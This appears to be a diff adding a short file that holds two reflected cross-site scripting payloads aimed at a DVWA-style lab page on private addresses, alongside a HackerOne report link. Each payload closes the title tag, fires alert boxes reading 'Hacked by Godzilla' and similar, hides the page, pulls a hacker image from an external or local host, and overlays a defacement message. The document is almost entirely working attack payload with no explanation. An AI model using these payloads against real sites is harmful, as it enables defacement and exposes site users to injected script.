@@ -1,0 +1,9 @@
+192.168.0.122/webtest1/vulnerabilities/xss_r/?name="><%2Ftitle><script>alert("Hacked by Godzilla")<%2Fscript><script>alert("We are weak in security")<%2Fscript><script>alert("Greetz Extremehacking.org")<%2Fscript><style>body{visibility%3Ahidden%3B} html{background-image%3A url(http://3.bp.blogspot.com/-c_ZQRk40Tlk/Tis30BVbcyI/AAAAAAAAAZE/TTpwkT3Fbnk/s1600/1hacker.jpg)%3B}<%2Fstyle>'"><div style%3D"position%3A absolute%3Bleft%3A 420px%3Btop%3A 40px%3B%2525E2%252580%25258B%2525E2%252580%25258Bz-index%3A 10%3Bvisibility%3A visible%3B color%3A White%3B font-size%3A 40px%3B"><font color%3Dyellow>Please improve your secuirty, Godzilla was here..<%2Ffont>
+
+
+
+https://hackerone.com/reports/260744
+
+192.168.0.119/webtest1/vulnerabilities/xss_r/?name="><%2Ftitle><script>alert("Hacked by Godzilla")<%2Fscript><script>alert("We are weak in security")<%2Fscript><script>alert("Greetz Extremehacking.org")<%2Fscript><style>body{visibility%3Ahidden%3B} html{background-image%3A url(http://192.168.0.105/1hacker.jpg)%3B}<%2Fstyle>'"><div style%3D"position%3A absolute%3Bleft%3A 420px%3Btop%3A 40px%3B%2525E2%252580%25258B%2525E2%252580%25258Bz-index%3A 10%3Bvisibility%3A visible%3B color%3A White%3B font-size%3A 40px%3B"><font color%3Dyellow>Please improve your secuirty, Godzilla was here..<%2Ffont>
+
+
